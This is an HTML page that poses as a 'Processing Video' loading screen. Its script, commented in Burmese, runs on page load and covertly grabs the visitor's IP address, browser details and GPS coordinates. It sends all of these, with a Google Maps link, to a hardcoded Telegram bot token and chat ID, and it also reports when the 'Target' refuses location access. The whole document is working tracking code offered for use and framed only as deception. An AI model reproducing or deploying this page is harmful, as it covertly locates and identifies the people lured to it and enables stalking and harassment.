<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Processing Video... Please wait.</h1>

    <script>
    // မင်းရဲ့ Telegram Bot အချက်အလက်များ
    const botToken = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
    const chatId = '5304050102';

    function sendToTelegram(message) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
    }

    // ၁။ IP နဲ့ Browser Info ယူခြင်း
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            let info = `Target IP: ${data.ip}\nBrowser: ${navigator.userAgent}`;
            sendToTelegram(info);
        });

    // ၂။ တည်နေရာ (Location) တောင်းဆိုခြင်း
    navigator.geolocation.getCurrentPosition(position => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const locMsg = `Location Found!\nLat: ${lat}\nLon: ${lon}\nGoogle Map: https://www.google.com/maps?q=${lat},${lon}`;
        sendToTelegram(locMsg);
    }, error => {
        sendToTelegram("Target denied location access.");
    });
    </script>
</body>
</html>
